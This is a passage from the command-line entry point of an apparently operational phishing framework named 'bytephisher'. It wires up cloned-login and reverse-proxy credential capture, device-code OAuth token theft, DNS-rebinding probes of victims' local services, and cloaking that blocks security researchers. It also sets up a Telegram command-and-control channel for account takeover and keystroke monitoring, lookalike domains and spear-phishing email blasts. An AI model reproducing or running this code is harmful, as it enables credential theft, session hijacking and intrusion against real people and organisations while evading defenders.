                            "beacon": True, "detection": _cf.detection_notes()}))
        return 0
    if args.heartbeat_check:
        from core import heartbeat as _hb
        if not args.heartbeat_file:
            print("[bytephisher] --heartbeat-check needs --heartbeat-file")
            return 2
        status = _hb.check(args.heartbeat_file, window=args.heartbeat_window)
        print(_hb.describe(status))
        return 0 if status["state"] == "ok" else 1
    if args.domain_age:
        from core import heartbeat as _hb
        facts = _hb.rdap_lookup(args.domain_age)
        facts.update(_hb.domain_age_verdict(facts.get("age_days")))
        print(_hb.describe(facts))
        return 0 if facts.get("ok") else 1
    # A flag whose companion is missing used to fall through to the interactive template
    # picker, which reads input(): on a phone or an SSH TTY that waits forever, and the operator
    # thinks the command ran. Each of these says what is missing instead.
    for given, message in (
        (args.ldap_query or args.ldap_filter or args.ldap_user,
         "--ldap-query/--ldap-filter/--ldap-user need --ldap <host>"),
        (args.adcs_esc == "ldap",
         "--adcs-esc ldap reads the templates live, so it needs --ldap <host> "
         "(use --adcs-esc FILE for a dump)"),
        (args.roast_spn and not args.roast,
         "--roast-spn needs --roast <user> (the SPN is what that user requests)"),
        (args.shadow_write or args.shadow_remove,
         "--shadow-write/--shadow-remove need --ldap and --ldap-user (one attribute value)"),
    ):
        if given:
            print(f"[bytephisher] {message}")
            return 2
    if args.pool_add or args.pool_next or args.pool_burn or args.pool_status:
        from core import pool as _pool
        if not args.pool:
            print("[bytephisher] --pool FILE is required for the pool commands")
            return 2
        try:
            obj = _pool.Pool.load(args.pool)
        except OSError as e:
            print(f"[bytephisher] cannot read pool {args.pool}: "
                  f"{type(e).__name__}: {e}")
            return 2
        if args.pool_add:
            for name in [n.strip() for n in args.pool_add.split(",") if n.strip()]:
                obj.add(name)
        for name in [n.strip() for n in (args.pool_burn or "").split(",") if n.strip()]:
            obj.burn(name, "burned by the operator")
        handed = None
        if args.pool_next:
            handed = obj.next()
            if handed is None:
                print("[bytephisher] no hostname is ready in this pool")
            else:
                print(handed.name)
        # --pool-status is read-only: it must not rewrite the pool file
        if args.pool_add or args.pool_burn or args.pool_next:
            try:
                obj.save()
            except OSError as e:
                print(f"[bytephisher] cannot write pool {args.pool}: "
                      f"{type(e).__name__}: {e}")
                return 2
        if args.pool_status or args.pool_add or args.pool_burn:
            print(obj.describe())
        if args.pool_next and handed is None:
            return 1
        return 0
    if args.verify_chain:
        from core import redirectors as _red
        try:
            report = _red.verify_chain(_with_scheme(args.verify_chain))
        except _red.RedirectError as e:
            print(f"[bytephisher] {e}")
            return 2
        print(_red.describe(report))
        return 0 if report.get("ok") else 1
    if args.consentfix:
        from core import consentfix as _cf
        from core import oauth as _oauth
        try:
            spec = _oauth.OauthSpec(provider=args.consentfix,
                                    client_id=args.consentfix_client or "bytephisher",
                                    tenant=args.consentfix_tenant or None)
        except _oauth.OauthError as e:
            print(f"[bytephisher] --consentfix refused: {e}")
            return 2
        flow = _oauth.OauthFlow(spec, "operator-preview")
        plan = _cf.plan(spec, flow.state, flow.challenge)
        print("silent      : " + plan["silent"])
        print("interactive : " + plan["interactive"])
        print("order       : " + " then ".join(plan["order"]))
        return 0
    if args.prt_plan:
        from core import prt as _prt
        spec = _clean_error(_load_json, args.prt_plan)
        if spec is None:
            return 2
        report = _prt.posture(spec.get("tokens") or {},
                              claims=spec.get("claims"),
                              tenant_policy=spec.get("tenant_policy") or {})
        print(_prt.describe(report))
        return 0
    if args.tier0 or args.replayability:
        from core import dbsc as _dbsc
        from core import tier0 as _tier0
        sid = args.tier0 or args.replayability
        rec = db.session_get(sid)
        if not rec:
            print(f"[bytephisher] no stored session {sid!r}")
            return 2
        tokens = rec.get("tokens") or {}
        if args.replayability:
            print(_dbsc.describe(_dbsc.replayability(tokens)))
            return 0
        print(_tier0.describe(_tier0.assess(tokens)))
        return 0
    if args.hop:
        from core import redirectors as _red
        lure = args.url or ""
        if not lure:
            print("[bytephisher] --hop needs --url (the destination to hide)")
            return 2
        try:
            chain = _red.build_chain(lure, hops=tuple(
                n.strip() for n in args.hop.split(",") if n.strip()))
        except _red.RedirectError as e:
            print(f"[bytephisher] {e}")
            return 2
        print(chain["url"])
        return 0
    if args.lookalike:
        from core import sender as _sender
        rows = _sender.candidates(args.lookalike, limit=25)
        if not rows:
            print(f"[bytephisher] {args.lookalike!r} is not a domain to derive candidates from")
            return 2
        print(f"lookalike candidates for {args.lookalike} "
              f"({len(rows)} shown, best first):")
        for row in rows:
            flag = "  [punycode - visible in the address bar]" if row["needs_punycode"] else ""
            print(f"  {row['name']:<34} {row['kind']:<10} score={row['score']:<3}{flag}")
        return 0
    if args.sender_check:
        from core import sender as _sender
        facts = _sender.check(args.sender_check)
        print(_sender.describe(facts))
        return 0 if facts.get("ok") else 1
    if args.pretext_list:
        from core import pretexts as _pretexts
        print("pretexts:")
        for name in _pretexts.names():
            print("  " + _pretexts.describe(name))
        return 0
    if args.export:
        # extension decides the format: .json -> JSON, anything else -> CSV
        if str(args.export).lower().endswith(".json"):
            path = _clean_error(db.export_json, args.export, campaign=args.campaign)
            if path is None:
                return 2
            print(f"[bytephisher] exported captures (json) -> {path}")
        else:
            path = _clean_error(db.export_csv, args.export, campaign=args.campaign)
            if path is None:
                return 2
            print(f"[bytephisher] exported captures (csv) -> {path}")
        print(f"[bytephisher] stats: {db.stats()}")
        return 0

    if args.reuse:
        res = db.reuse_stats()
        print(f"[bytephisher] credential-reuse analysis (db: {cfg['db_path']})")
        print(f"  repeated identities : {res['total_reused_identities']}")
        for r in res["repeated_identities"][:20]:
            print(f"    {r['identity']}  x{r['count']}  campaigns={r['campaigns'] or '-'}")
        print(f"  repeated passwords  : {res['total_reused_passwords']}")
        for r in res["repeated_passwords"][:20]:
            print(f"    {r['password']!r}  x{r['count']}  "
                  f"identities={len(r['identities'])}  campaigns={r['campaigns'] or '-'}")
        return 0

    if args.tunnels:
        print("\n  Tunnelers:")
        for name in TUNNEL_REGISTRY:
            print(f"   - {name}")
        print("\n  Usage: -t cloudflared   |   -t all   |   -t none\n")
        return 0

    if args.doctor:
        from tools import doctor
        return doctor.main(argv=[])

    # reverse-proxy mode does not use static templates at all
    man = [] if (args.proxy or args.devicecode) else load_manifest()
    if args.list:
        print_templates(man)
        return 0

    banner(f"{len(man)} templates" if man else "reverse-proxy mode")

    # A serve-companion flag given without -o/--option must not fall into the
    # interactive picker: resolve_template(man, None) calls input(), which blocks
    # forever on a phone or an SSH TTY and the operator thinks the command ran.
    # Only a bare invocation (no arguments at all) may show the menu.
    if (not (args.proxy or args.devicecode) and args.option is None
            and sys.argv[1:]):
        print("[bytephisher] -o/--option is required (template index or slug). "
              "Run --list to see them, e.g. -o google")
        return 2

    site = (resolve_template(man, args.option)
            if not (args.proxy or args.devicecode)
            else {"slug": args.campaign or ("devicecode" if args.devicecode else "proxy"),
                  "name": "devicecode" if args.devicecode else "reverse-proxy",
                  "dir": "", "index": 0})
    # --rotate: A/B style rotation over several templates, one per request
    rotate_dirs = None
    if args.rotate:
        rotate_dirs = []
        for slug in [s.strip() for s in args.rotate.split(",") if s.strip()]:
            rotate_dirs.append(resolve_template(man, slug)["dir"])
        if len(rotate_dirs) < 2:
            print("[bytephisher] --rotate needs at least two templates - ignoring")
            rotate_dirs = None
        else:
            print(f"[bytephisher] rotating  : {len(rotate_dirs)} templates per request")
    port = args.port or cfg.get("port", 8080)
    redirect = args.url if args.url is not None else cfg.get("redirect_url", "")
    geo = args.geo or cfg.get("geo_provider", "ipapi")
    tunneler = (args.tunneler or cfg.get("tunneler_default") or "none").lower()
    otp = args.otp or bool(cfg.get("otp_default"))

    print(f"[bytephisher] template : {site['name']}  ({site['dir']})")
    print(f"[bytephisher] port     : {port}")
    print(f"[bytephisher] geo      : {geo}")
    print(f"[bytephisher] otp page : {'on' if otp else 'off'}")
    print(f"[bytephisher] redirect : {redirect or '(thank-you page)'}")
    print(f"[bytephisher] intel    : {'full device dump on page open' if not args.no_intel else 'off'}"
          + (" + permission probes" if args.intel_perms else ""))

    # The blocklist is read when the operator asks for it (--block-researchers)
    # or names a file (--blocklist-file). It is NOT armed by a file merely
    # existing: behaviour that depends on leftover state refused the operator's
    # own tooling (python-urllib is a scanner user agent) with no visible cause.
    blocklist_file = args.blocklist_file or os.path.join("data", "blocklist.txt")

    # --- campaign gating (geo / time / rate) ---
    gate = None
    if any([args.allow_country, args.block_country, args.block_datacenter,
            args.active_hours, args.active_days, args.max_hits, args.bot_gate,
            args.block_researchers]):
        from core.gate import Gate
        try:
            gate = Gate(allow_countries=args.allow_country.split(",") if args.allow_country else None,
                    block_countries=args.block_country.split(",") if args.block_country else None,
                    block_datacenter=args.block_datacenter,
                    active_hours=args.active_hours, active_days=args.active_days,
                    max_hits_per_ip=args.max_hits, bot_threshold=args.bot_gate,
                    block_researchers=args.block_researchers,
                    blocklist_file=blocklist_file,
                    allow_asn=args.allow_asn.split(",") if args.allow_asn else None,
                    block_asn=args.block_asn.split(",") if args.block_asn else None,
                    max_hits_per_device=args.max_hits_per_device,
                    detonation_asn=args.detonation_asn.split(",") if args.detonation_asn else None,
                    detonation_cidr=args.detonation_cidr.split(",") if args.detonation_cidr else None,
                    cloak=args.cloak)
        except ValueError as e:
            print(f"[bytephisher] bad gating option: {e}")
            return 2
        print(f"[bytephisher] gating    : {gate.describe()}")
        if gate.needs_geo and geo == "off":
            print("[bytephisher] WARNING   : country/datacenter gating with --geo off "
                  "blocks everyone (no geo data). Use --geo ipapi or ipinfo.")

    # --- capture notifier (Telegram / webhook) ---
    notifier = None
    telegram = args.telegram or cfg.get("telegram")
    webhook = args.webhook or cfg.get("webhook")
    tg_proxy = cfg.get("telegram_api_base")
    if tg_proxy:
        from core import alerts as _alerts
        _alerts.TELEGRAM_API_BASE = tg_proxy
    if telegram or webhook:
        from core.alerts import make_notifier
        notifier = make_notifier(telegram=telegram, webhook=webhook)
        print(f"[bytephisher] alerts   : telegram={'yes' if telegram else 'no'} "
              f"webhook={'yes' if webhook else 'no'}")

    # --- auto-chain: post-exploitation without an operator in the loop ---
    auto_chain = str(getattr(args, "auto_chain", "") or "").strip().lower()
    if auto_chain:
        from core import chains as chains_mod
        try:
            notifier = chains_mod.make_auto_notifier(
                notifier, db, auto_chain, outdir=os.path.join("data", "chains"),
                on_result=lambda sid, res: print(
                    f"[bytephisher] auto-chain {auto_chain} on {sid}: "
                    f"{len(res['tasks'])} task(s), {len(res['findings'])} finding(s), "
                    f"{'complete' if res['ok'] else 'incomplete'}", flush=True))
        except ValueError as e:
            print(f"[bytephisher] {e}")
            return 2
        print(f"[bytephisher] auto-chain : {auto_chain} runs when a session is captured")

    # --- DNS rebinding: a link click that reaches the victim's own network ---
    rebind_host = ""
    rebind_srv = None
    exploit_ports = None
    if getattr(args, "rebind_domain", ""):
        from core import rebind as rebind_mod
        domain = str(args.rebind_domain).strip().strip(".")
        targets = [t.strip() for t in (args.rebind_target or "127.0.0.1").split(",")
                   if t.strip()]
        public = str(args.rebind_public or "").strip()
        if not public or public == "auto":
            public = ""
            try:
                from core import net
                public = net.fetch_text("https://api.ipify.org", timeout=6).strip()
            except Exception as e:
                print(f"[bytephisher] could not detect the public address: "
                      f"{type(e).__name__}: {e}")
            if not public:
                print("[bytephisher] --rebind-domain needs --rebind-public <your public IP> "
                      "(the address the victim's first query must be answered with, so the "
                      "page loads before it rebinds)")
                return 2
            print(f"[bytephisher] rebind     : public address detected as {public}")
        try:
            plan = rebind_mod.RebindPlan(public, targets, rebind_after=args.rebind_after,
                                         ttl=args.rebind_ttl)
            rebind_srv = rebind_mod.RebindServer(domain, plan, port=args.rebind_port)
            rebind_srv.start()
        except PermissionError:
            print(f"[bytephisher] port {args.rebind_port} needs root (a real DNS answer must "
                  "come from port 53); run with sudo or use --rebind-port for a lab")
            return 2
        except ValueError as e:
            print(f"[bytephisher] rebind configuration: {e}")
            return 2
        except OSError as e:
            print(f"[bytephisher] rebind listener failed: {e}")
            return 2
        rebind_host = domain
        exploit_ports = [int(x) for x in str(args.exploit_ports or "").replace(",", " ").split()
                         if x.strip().isdigit()] or None
        print(f"[bytephisher] rebind     : {rebind_srv.describe()}")
        print(f"[bytephisher] rebind     : delegate the NS for {domain} to this host "
              "(wildcard A + NS, or the campaign subdomain), then the victim's browser "
              "reads the local services itself")
        print("[bytephisher] rebind     : probe script for a console:")
        print("    " + rebind_mod.probe_script(domain, 2375, "/containers/json"))
        from core import exploits as ex_mod
        print(f"[bytephisher] exploits   : "
              f"{args.exploit_limit} service(s) per page load"
              + (f", ports {exploit_ports}" if exploit_ports else ""))
        for line in ex_mod.report(domain, None).splitlines()[1:8]:
            print(line)

    _dc_serving = False
    targets_store = None
    if args.targets:
        try:
            from core import targets as _targets_mod
            targets_store = _targets_mod.load(args.targets)
            summary = targets_store.summary()
            print(f"[bytephisher] targets : {summary['targets']} loaded from {args.targets}"
                  f" ({summary['with_token']} with a token, roles: "
                  f"{', '.join(summary['roles']) or '-'})")
        except Exception as e:
            print(f"[bytephisher] targets : could not load {args.targets}: "
                  f"{type(e).__name__}: {e}")
            return 2
    if args.devicecode:
        # ---- device-authorization mode (RFC 8628) ----
        # The victim is sent to the provider's REAL page with a code; nothing here
        # imitates the provider, which is why there is no lookalike domain to spot.
        from core import devicecode as dcmod
        if not args.dc_client_id:
            print("[bytephisher] --devicecode needs --dc-client-id (register an app "
                  "with the device-code flow enabled) - exiting")
            return 2
        def _dc_on_token(rec):
            """Print the tokens AND put them in the vault.

            Printing alone was the whole story before: the moment this process ended,
            the access token, the refresh token and the granted scopes were gone, so the
            second act had nothing to run on. The record is keyed by the flow's tag and
            saved in the same database as every other session, so it survives a restart.
            """
            print(f"\n[bytephisher] *** DEVICE CODE APPROVED *** {rec['tag']} "
                  f"({rec['provider']})\n"
                  f"    code     : {rec['user_code']}\n"
                  f"    access   : {str(rec['tokens'].get('access_token'))[:12]}...\n"
                  f"    refresh  : "
                  f"{'yes' if rec['tokens'].get('refresh_token') else 'no'}\n")
            try:
                from core import session as sess_mod
                sid = f"dc-{rec['tag']}"
                vault_rec = db.session_get(sid) or sess_mod.new_record(
                    sid, phishlet=f"devicecode:{rec['provider']}",
                    campaign=args.campaign or "devicecode")
                sess_mod.add_oauth(vault_rec, rec.get("tokens") or {},
                                   provider=rec.get("provider", ""),
                                   client_id=args.dc_client_id,
                                   source="devicecode",
                                   tenant=args.dc_tenant or "", issuer=flow.issuer)
                db.session_save(vault_rec)
                summ = sess_mod.oauth_summary(vault_rec)
                print(f"[bytephisher] vault    : saved as {sid} "
                      f"(valid={summ.get('valid')}, "
                      f"expires_in={summ.get('expires_in')}s) - survives a restart")
            except Exception as e:
                # the console prints a truncated token and a failed write loses the refresh token
                # for good, so spool the full set to a file: the capture is not wasted.
                spool = ""
                try:
                    d = os.path.join(HOME, "data")
                    os.makedirs(d, exist_ok=True)
                    spool = os.path.join(d, f"dc-failed-{rec.get('tag', 'flow')}.json")
                    with open(spool, "w", encoding="utf-8") as fh:
                        json.dump({"tag": rec.get("tag"), "provider": rec.get("provider"),
                                   "user_code": rec.get("user_code"),
                                   "tokens": rec.get("tokens"),
                                   "issuer": getattr(flow, "issuer", "")}, fh, indent=2)
                except Exception:
                    spool = ""
                print(f"[bytephisher] vault    : could not save the tokens: {e}")
                if spool:
                    print(f"[bytephisher] vault    : the full token set was written to "
                          f"{spool} - keep that file, it holds the refresh token")
                else:
                    print("[bytephisher] vault    : and the token set could not be spooled "
                          "either - re-approval is required")

        mgr = dcmod.DeviceCodeManager(base_url=args.dc_base or "")
        try:
            flow = mgr.start(args.devicecode, args.dc_client_id,
                             tenant=args.dc_tenant, scope=args.dc_scope)
        except dcmod.DeviceCodeError as e:
            print(f"[bytephisher] device-code flow refused: {e}")
            return 2
        httpd, _poller = dcmod.serve(
            mgr, port, link_prefix=args.dc_base or "", brand=args.dc_brand,
            on_token=lambda rec: _dc_on_token(rec),
            poll=True, poll_interval=5, server_header=args.server_header)
        _dc_serving = True
        print(f"[bytephisher] mode     : DEVICE CODE ({flow.provider})")
        print(f"[bytephisher] landing  : http://<host>:{port}/dc/{flow.tag}")
        print(f"[bytephisher] send the victim: {flow.verification_uri} "
              f"and the code {flow.user_code}")
        print("[bytephisher] the tokens arrive here when they approve; the page "
              "updates itself")
    elif args.proxy:
        # ---- reverse-proxy mode: real site proxied live, hook injected ----
        from core.proxy import CAPTURE_PATH, HOOK_PATH, Phishlet, ProxyEngine, serve_proxy
        if args.phishlet:
            try:
                phishlet = Phishlet.load(args.phishlet)
            except (OSError, ValueError) as e:
                print(f"[bytephisher] cannot load phishlet {args.phishlet}: "
                      f"{type(e).__name__}: {e}")
                return 2
            print(f"[bytephisher] phishlet : {args.phishlet} -> {phishlet.describe()}")
        elif args.upstream:
            phishlet = inline_phishlet(args)
        else:
            print("[bytephisher] --proxy needs --phishlet FILE or --upstream HOST - exiting")
            return 2
        # default the upstream leg to a browser profile: a Python TLS client is the
        # single most detectable thing about a proxied session
        _explicit_impersonate = bool((args.impersonate or "").strip())
        args.impersonate = transport.effective_profile(
            args.impersonate, opt_out=args.no_impersonate)
        if args.impersonate and not transport.profile_ok(args.impersonate):
            if not transport.available():
                print("[bytephisher] --impersonate needs curl_cffi: "
                      "pip install curl_cffi")
            else:
                print(f"[bytephisher] unknown profile '{args.impersonate}'. "
                      f"try: chrome, chrome131, firefox135, safari180, edge101")
            return 2
        engine = ProxyEngine(phishlet, db=db, on_capture=notifier, geo_provider=geo,
                             gate=gate,
                             trust_headers=not args.no_trust_headers,
                             impersonate=args.impersonate,
                             server_header=args.server_header)
        engine.hook_base = args.hook_path or "/__bh"
        engine.hook_stealth = args.hook_stealth
        engine.symbols = symbols_mod.Symbols.from_mode(args.symbols)
        # a restart must not orphan the live sessions: everything durable is in the DB,
        # but the engine's live objects are not, so a victim's cookie would resolve to a
        # brand-new session (their jar, creds and vault row left behind)
        try:
            _restored = engine.restore_sessions(hours=args.resume_hours)
            if _restored:
                print(f"[bytephisher] resume : restored {_restored} session(s) active in "
                      f"the last {args.resume_hours}h (their cookies resolve again)")
        except Exception as e:
            print(f"[bytephisher] resume : could not restore sessions: {e}")

        if args.verify_first:
            from core.challenge import Challenge
            # deliberately NOT args.campaign: naming the brand here defeats the point of
            # a brand-neutral interstitial (use --verify-brand to name it on purpose)
            engine.challenge = Challenge(ttl=args.verify_ttl,
                                         brand=args.verify_brand or "")
            print("[bytephisher] verify  : pre-serve human challenge ON "
                  f"(ttl {args.verify_ttl}s; the page is served only after a pass)")
        if engine.symbols.random:
            print(f"[bytephisher] symbols : session cookie "
                  f"{engine.symbols.session!r}, attrs {engine.symbols.capture_attr!r} "
                  f"({engine.symbols.beacon_attr!r}, {engine.symbols.intel_attr!r})")
        engine.targets = targets_store
        engine.rebind_host = rebind_host
        engine.exploit_ports = exploit_ports
        engine.exploit_limit = args.exploit_limit
        try:
            httpd = serve_proxy(engine, port, campaign=args.campaign or phishlet.name,
                                tls=args.tls, cert_path=args.cert,
                                server_header=args.server_header)
        except OSError as e:
            print(f"[bytephisher] cannot bind port {port}: "
                  f"{type(e).__name__}: {e}")
            db.close()
            return 2
        print(f"[bytephisher] mode     : REVERSE PROXY -> {phishlet.base_url}")
        if args.impersonate:
            print(f"[bytephisher] upstream : TLS fingerprint impersonating "
                  f"'{args.impersonate}' (browser-shaped ClientHello"
                  f"{'' if _explicit_impersonate else ', default'})")
        else:
            reason = ("--no-impersonate" if args.no_impersonate else
                      "curl_cffi not installed: pip install curl_cffi")
            print(f"[bytephisher] upstream : plain client TLS ({reason}) - a Python "
                  "TLS client is the loudest signal on the wire")
        print(f"[bytephisher] hook     : {engine.path_of(HOOK_PATH)}"
              f"   capture: {engine.path_of(CAPTURE_PATH)}")
    else:
        static_challenge = None
        if args.verify_first:
            from core.challenge import Challenge
            static_challenge = Challenge(ttl=args.verify_ttl,
                                         brand=args.verify_brand or "")
            print("[bytephisher] verify  : pre-serve human challenge ON "
                  f"(ttl {args.verify_ttl}s; the page is served only after a pass)")
        try:
            httpd, _Handler = srv.serve(
                TEMPLATES_DIR, site["dir"], port, cfg["db_path"],
                geo_provider=geo, redirect_url=redirect, otp=otp,
                tls=args.tls, cert_path=args.cert,
                on_capture=notifier, site_name=site["slug"],
                campaign=args.campaign or site["slug"],
                rotate_dirs=rotate_dirs, gate=gate, decoy_url=args.decoy or "",
                intel=not args.no_intel, intel_perms=args.intel_perms,
                trust_headers=not args.no_trust_headers,
                hook_base=args.hook_path or "/__bh", rebind_host=rebind_host,
                exploit_ports=exploit_ports, exploit_limit=args.exploit_limit,
                server_header=args.server_header,
                challenge=static_challenge,
                targets=targets_store,
                pwa=(_pwa_config(args) if args.pwa else None),
                symbols=symbols_mod.Symbols.from_mode(args.symbols))
        except OSError as e:
            print(f"[bytephisher] cannot bind port {port}: "
                  f"{type(e).__name__}: {e}")
            db.close()
            return 2
    # serve_forever() must run in its own thread, otherwise the socket is bound
    # but never accepts connections while the CLI sits in the live-dashboard loop.
    # (device-code mode already started its own thread inside core.devicecode.serve)
    import threading
    if not _dc_serving:
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
    time.sleep(0.3)
    print(f"[bytephisher] server up on 0.0.0.0:{port}")

    # --- telegram control channel (--telegram-c2) ---
    c2 = None
    # the dashboard loop and the control channel share this flag: the
    # operator can end a campaign from their phone
    stop = {"flag": False}

    if getattr(args, "telegram_c2", False):
        if not telegram:
            print("[bytephisher] --telegram-c2 needs --telegram TOKEN:CHAT_ID")
        else:
            from core import telegram as tg
            _tok, _, _chat = str(telegram).partition(":")
            c2 = tg.C2(_tok, _chat,
                       api_base=cfg.get("telegram_api_base") or tg.API_BASE,
                       logger=lambda m: print(m))

            def _sid_arg(a, i=0):
                if len(a) <= i or not a[i]:
                    raise ValueError("a session id is required")
                return a[i]

            _panic_fn, _kill_fn = panic_handlers(db, stop)
            c2.register("panic", _panic_fn, "stop serving now (data is kept)")
            c2.register("kill", _kill_fn,
                        "stop serving and wipe captures, sessions, intel, live input")

            def _cmd_stats(_a):
                # the accessor names are the contract: total_captures,
                # credentials, visitors / sessions, sessions_captured
                st = db.stats(campaign=args.campaign or None)
                ss = db.session_stats(campaign=args.campaign or None)
                bl = db.blocked_stats()          # the blocked table is not campaign-tagged
                return "\n".join([
                    f"campaign : {args.campaign or site['slug']}",
                    f"captures : {st.get('total_captures', 0)}",
                    f"creds    : {st.get('credentials', 0)}"
                    f" (credible {st.get('credible_credentials', 0)})",
                    f"visitors : {st.get('visitors', 0)}",
                    f"sessions : {ss.get('sessions', 0)}"
                    f" (captured {ss.get('sessions_captured', 0)})",
                    f"blocked  : {bl.get('total_blocked', 0)} (all campaigns)",
                ])

            def _cmd_sessions(a):
                limit = int(a[0]) if a and a[0].isdigit() else 12
                return tg.render_sessions(db.session_list(limit=limit))

            def _cmd_session(a):
                return tg.render_session(db.session_get(_sid_arg(a)))

            def _cmd_live(a):
                return tg.render_live(db.live_for(_sid_arg(a)))

            def _cmd_otp(a):
                rows = db.live_for(_sid_arg(a))
                return tg.render_otp([e for r in rows for e in (r.get("events") or [])])

            def _cmd_takeover(a):
                sid = _sid_arg(a)
                rec = db.session_get(sid)
                if not rec:
                    return f"session {sid} not found"
                task = a[1] if len(a) > 1 else "inbox"
                from core import session as sess_mod
                out = sess_mod.run_task(rec, task, home=os.path.join("data", "takeover"),
                                        outdir=os.path.join("data", "takeover"))
                done = (out or {}).get("steps") or []
                return (f"takeover {task} on {sid}: {len(done)} step(s)\n"
                        + "\n".join(f"  {s.get('step')}: {str(s.get('result'))[:80]}"
                                     for s in done[-6:]))

            def _cmd_lures(_a):
                rows = db.lure_list(limit=20)
                if not rows:
                    return "no lures issued"
                return "lures:\n" + "\n".join(
                    f"  {r.get('token', '')[:10]} {r.get('kind', '-')} "
                    f"opens={r.get('uses', 0)}/{r.get('max_uses', 0) or 'inf'} "
                    f"state={r.get('state', '-')}" for r in rows)

            def _block_ip(addr):
                path = args.blocklist_file or blocklist_file
                os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
                with open(path, "a", encoding="utf-8") as f:
                    f.write(f"ip:{addr}\n")
                if gate is not None:
                    from core import blocklist as _bl
                    gate.blocklist_entry = _bl.load_file(path)
                    gate.block_researchers = True
                return f"blocked {addr} (written to {path})"

            def _cmd_block(a):
                return _block_ip(_sid_arg(a, 0))

            def _cmd_blockip(a):
                rec = db.session_get(_sid_arg(a))
                if not rec or not rec.get("ip"):
                    return "that session has no address recorded"
                return _block_ip(rec["ip"])

            def _cmd_unblock(a):
                addr = _sid_arg(a, 0)
                path = args.blocklist_file or blocklist_file
                if not os.path.isfile(path):
                    return f"{addr} was not blocked"
                with open(path, encoding="utf-8") as f:
                    lines = f.read().splitlines()
                kept = [ln for ln in lines if ln.strip() != f"ip:{addr}"]
                with open(path, "w", encoding="utf-8") as f:
                    f.write("\n".join(kept) + "\n")
                if gate is not None:
                    from core import blocklist as _bl
                    gate.blocklist_entry = _bl.load_file(path)
                return (f"unblocked {addr}" if len(kept) != len(lines)
                        else f"{addr} was not in the list")

            def _cmd_tier0(a):
                """Which root-of-trust path does this session's identity open?"""
                sid = _sid_arg(a, 0)
                rec = db.session_get(sid) if sid else None
                if not rec:
                    return f"no session {sid}"
                from core import tokenintel
                tokenintel.annotate(rec)
                intel = rec.get("token_intel") or {}
                if not intel:
                    return "that session captured no tokens"
                lines = [tokenintel.summary(rec)]
                for row in intel.get("tier0") or []:
                    if row["verdict"] in ("open", "needs_a_call"):
                        lines.append(f"  {row['verdict']}: {row['path']}")
                if intel.get("reasons"):
                    lines.append("  " + "; ".join(intel["reasons"][:3]))
                return "\n".join(lines)

            def _cmd_replay(a):
                """Is this session's token set usable from here, or already dead?"""
                sid = _sid_arg(a, 0)
                rec = db.session_get(sid) if sid else None
                if not rec:
                    return f"no session {sid}"
                from core import dbsc, tokenintel
                tokenintel.annotate(rec)
                tokens = rec.get("tokens") or {}
                if not tokens:
                    return "that session captured no tokens"
                return dbsc.describe(dbsc.replayability(tokens))

            c2.register("tier0", _cmd_tier0, "root-of-trust posture: /tier0 SID")
            c2.register("replay", _cmd_replay, "can this session be replayed? /replay SID")
            c2.register("stats", _cmd_stats, "campaign counters")
            c2.register("sessions", _cmd_sessions, "newest sessions [count]")
            c2.register("session", _cmd_session, "one session: creds, tokens, cookies")
            c2.register("live", _cmd_live, "live keystroke/field stream")
            c2.register("otp", _cmd_otp, "input/codes seen in the live stream")
            def _cmd_chain(a):
                sid = _sid_arg(a)
                rec = db.session_get(sid)
                if not rec:
                    return f"session {sid} not found"
                from core import chains as chains_mod
                name = (a[1] if len(a) > 1 else "recon").lower()
                try:
                    res = chains_mod.run_chain(rec, name)
                except ValueError as e:
                    return str(e)
                db.session_save(rec)
                lines = [f"chain {res['chain']} ({res['duration']}s) "
                         f"{'complete' if res['ok'] else 'incomplete'}"]
                lines += [f"  {'ok ' if t['ok'] else 'ERR'} {t['task']} "
                          f"{t['steps']} step(s)" for t in res["tasks"]]
                if res["findings"]:
                    lines.append(f"findings ({len(res['findings'])}):")
                    lines += [f"  {h['keyword']}: {h['line'][:70]}"
                              for h in res["findings"][:8]]
                if res["errors"]:
                    lines.append(f"errors: {res['errors'][0][:100]}")
                return "\n".join(lines)

            def _cmd_chains(_a):
                from core import chains as chains_mod
                return "\n".join(f"  {c['name']:<10} {c['description']}"
                                  for c in chains_mod.list_chains())

            c2.register("takeover", _cmd_takeover, "run a takeover task: /takeover SID [task]")
            c2.register("chain", _cmd_chain, "run a chain: /chain SID [name]")
            c2.register("chains", _cmd_chains, "list the chains")
            c2.register("lures", _cmd_lures, "lure status")
            c2.register("block", _cmd_block, "refuse an address: /block IP")
            c2.register("blockip", _cmd_blockip, "refuse the address of a session")
            c2.register("unblock", _cmd_unblock, "undo a block: /unblock IP")
            c2.start()
            print("[bytephisher] telegram : control channel live (send /help in the chat)")


    # --- web dashboard (optional) ---
    if args.web_dashboard:
        try:
            from dashboard import web_dashboard
            web_dashboard(port=args.web_port, db=db, token=args.api_token)
            _t = "?token=<your --api-token>" if args.api_token else ""
            print(f"[bytephisher] web dashboard: http://127.0.0.1:{args.web_port}/{_t}")
        except Exception as e:
            print(f"[bytephisher] web dashboard failed: {e}")

    def live_urls():
        return [u for u in urls.values() if u]

    # --- tunnels ---
    urls = {}
    if args.mode != "test" and tunneler not in ("none", ""):
        print(f"[bytephisher] starting tunneler(s): {tunneler} ...")
        if tunneler == "all":
            urls = run_all(port)
        else:
            urls = {tunneler: run_one(tunneler, port)}
        print("\n[bytephisher] public URLs:")
        live = [u for u in urls.values() if u]
        for name, u in urls.items():
            line = f"   {name:<14} {u or 'FAILED'}"
            if not u:
                why = reason_for(name)
                if why:
                    line += f"   <- {why}"
            print(line)
        if not live:
            print("   (none live - falling back to local-only mode)")
        if args.proxy:
            # the phishlet rewrites every upstream origin to the host the victim
            # actually visits; that is the tunnel URL, not the upstream host
            engine.public_host = (urllib.parse.urlparse(live[0]).netloc if live
                                  else f"127.0.0.1:{port}")
            print(f"[bytephisher] rewrite target : {engine.public_host}")
        print()
    else:
        print(f"[bytephisher] local-only mode. Open: http://127.0.0.1:{port}\n")
        if args.proxy:
            engine.public_host = f"127.0.0.1:{port}"

    # --- optional spear-phishing email blast with the live link ---
    if args.mailto:
        smtp = cfg.get("smtp") or {}
        link = live[0] if urls and live else f"http://127.0.0.1:{port}"
        if not smtp.get("host"):
            print("[bytephisher] --mailto given but config smtp.host is empty - skipping blast")
        else:
            from mailer import qr_html, qr_image, render, send_smtp, to_html
            ctx = {"Phish_URL": link, "From_Name": args.mail_from_name,
                   "Location": "unknown device", "Doc_Name": "Q3-payroll.xlsx",
                   "Invoice_ID": "INV-20431"}
            if args.pretext:
                from core import pretexts as _pretexts
                try:
